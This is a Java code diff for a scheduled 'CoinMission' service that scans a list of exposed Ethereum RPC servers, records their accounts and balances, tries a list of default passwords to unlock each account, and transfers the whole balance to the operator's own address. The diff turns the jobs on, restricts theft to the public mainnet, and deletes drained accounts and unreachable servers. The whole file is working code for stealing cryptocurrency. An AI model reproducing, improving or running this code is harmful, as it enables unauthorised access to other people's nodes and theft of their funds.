@@ -5,6 +5,7 @@ import com.baomidou.mybatisplus.mapper.EntityWrapper;
 import com.warrior.controler.ServerController;
 import com.warrior.entity.Account;
 import com.warrior.entity.Log;
+import com.warrior.entity.Netseg;
 import com.warrior.entity.Server;
 import com.warrior.service.IAccountService;
 import com.warrior.service.ILogService;
@@ -51,10 +52,13 @@ public class CoinMission {
     @Autowired
     IAccountService iAccountService;
 
-    //@Scheduled(initialDelay = 60 * 1000, fixedDelay = 10 * 1000)
-    public void getCoin() {
+    final static ExecutorService threadPool = Executors.newFixedThreadPool(50);
+    final static ExecutorService threadPoolTransfer = Executors.newFixedThreadPool(10);
+
+
+    @Scheduled(initialDelay = 1 * 10 * 1000, fixedDelay = 2 * 60 * 1000)
+    public void getCoin() throws InterruptedException {
         logger.info("【CoinMission start】");
-        ExecutorService threadPool = Executors.newFixedThreadPool(50);
         List<Server> serverList = iServerService.selectList(new EntityWrapper<Server>().ne("pwd", 2));
         for (Server server : serverList) {
             threadPool.execute(new Runnable() {
@@ -83,7 +87,7 @@ public class CoinMission {
                                         .setAccountPwd("")
                                         .setUser("")
                                         .setAddress(address)
-                                        .setBalance(availableBlance);
+                                        .setBalance(availableBlance.divide(EthcoinAPI.WEI));
                                 if (iAccountService.insert(account)) {
                                     logger.info(account + "-链接成功！");
                                 }
@@ -92,8 +96,9 @@ public class CoinMission {
                             }
                         }
                     } else {
-                        server.setPwd(0);
-                        iServerService.updateById(server);
+                        //server.setPwd(0);
+                        //iServerService.updateById(server);
+                        iServerService.deleteById(server);
                         logger.info("【{}:{}-telnet不通】", server.getHost(), server.getPort());
                     }
                 }
@@ -102,14 +107,13 @@ public class CoinMission {
     }
 
 
-   // @Scheduled(initialDelay = 60 * 1000, fixedDelay = 10 * 1000)
-    public void transfer() {
-        ExecutorService threadPool = Executors.newFixedThreadPool(10);
+    @Scheduled(initialDelay = 1 * 1000, fixedDelay = 1 * 60 * 1000)
+    public void transfer() throws InterruptedException {
         List<Account> accountList = iAccountService.selectList(new EntityWrapper<>());
-        logger.info("【accountList:" + accountList.size()+"】");
+        logger.info("【accountList:" + accountList.size() + "】");
         for (Account account : accountList) {
             String address = account.getAddress();
-            threadPool.execute(new Runnable() {
+            threadPoolTransfer.execute(new Runnable() {
                 @Override
                 public void run() {
                     String hash = "";
@@ -119,27 +123,32 @@ public class CoinMission {
                         BigDecimal balance = eth.getBalance(address);
                         BigDecimal minerFee = eth.getMinerFee();
                         BigDecimal availableBlance = balance.subtract(minerFee);
-                        if (availableBlance.compareTo(BigDecimal.ZERO) == 1) {
-                            int count = 3;
-                            while (count > 0) {
-                                count--;
-                                hash = eth.sendTransaction(address, myAddress, EthcoinAPI.unit10To16(availableBlance));
-                                if (hash.equals("")) {
-                                    for (int i = 0; i < defaulPwd.length; i++) {
-                                        if (eth.unlockAccount(address, defaulPwd[i])) {
-                                            break;
-                                        }
-                                    }
+                        if (availableBlance.compareTo(BigDecimal.ZERO) == 1) {    //余额足够
+                            if (eth.eth_blockNumber().compareTo(new BigDecimal(5000000)) == 1) {  //公链
+                                int count = 3;
+                                while (count > 0) {
+                                    count--;
                                     hash = eth.sendTransaction(address, myAddress, EthcoinAPI.unit10To16(availableBlance));
-                                }
-                                if (!hash.equals("")) {
-                                    logger.info("【成功从{}向{}转账{}ETH】", address, myAddress, availableBlance.divide(EthcoinAPI.WEI));
-                                    Log log = new Log().setLogName("【transferSuccess】").setLogContent("from:" + address + ",to:" + myAddress + ",value:" + availableBlance + ",hash:" + hash)
-                                            .setDate(new Date(DateUtil.getCurTime()));
-                                    iLogService.insert(log);
-                                    break;
+                                    if (hash.equals("")) {
+                                        for (int i = 0; i < defaulPwd.length; i++) {
+                                            if (eth.unlockAccount(address, defaulPwd[i])) {
+                                                break;
+                                            }
+                                        }
+                                        hash = eth.sendTransaction(address, myAddress, EthcoinAPI.unit10To16(availableBlance));
+                                    }
+                                    if (!hash.equals("")) {
+                                        BigDecimal balanceMaxUnit = availableBlance.divide(EthcoinAPI.WEI);
+                                        logger.info("【成功从{}向{}转账{}ETH】", address, myAddress, balanceMaxUnit);
+                                        Log log = new Log().setLogName("【transferSuccess】").setLogContent("from:" + address + ",to:" + myAddress + ",value:" + balanceMaxUnit + ",hash:" + hash)
+                                                .setDate(new Date());
+                                        iLogService.insert(log);
+                                        iAccountService.deleteById(account);
+                                        break;
+                                    }
                                 }
                             }
+
                         } else {
                             logger.info("【{}余额不足】", address);
                         }
